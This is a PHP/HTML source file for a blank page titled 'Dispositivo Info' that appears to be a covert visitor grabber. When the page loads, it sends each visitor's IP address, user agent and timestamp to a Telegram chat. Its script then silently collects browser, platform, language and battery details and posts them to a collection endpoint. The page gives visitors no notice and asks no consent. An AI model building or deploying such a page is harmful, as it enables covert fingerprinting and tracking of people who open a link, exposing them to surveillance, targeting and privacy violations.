<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/ip_utils.php';

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "📱 <b>Info del dispositivo</b>\n" .
       "📌 IP: $ip\n" .
       "🖥 Navegador: $ua\n" .
       "⏰ Hora: $ts";
send_to_telegram($msg);
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Dispositivo Info</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
</head>
<body>
<script>
$(document).ready(function(){

    var n1 = navigator.userAgent;
    var n2 = navigator.appName;
    var n3 = navigator.appVersion;
    var n4 = navigator.platform;
    var n5 = navigator.language;

    navigator.getBattery().then(function(battery){
        var bateri = Math.round(battery.level * 100);

        $.ajax({
            url: 'device_info.php',
            type: 'POST',
            dataType: 'json',
            data: {
                agent: n1,
                navegador: n2,
                versionapp: n3,
                sistema: n4,
                idioma: n5,
                bateria: bateri
            },
            success: function(response){
                console.log(response);
            }
        });
    });

});
</script>
</body>
</html>
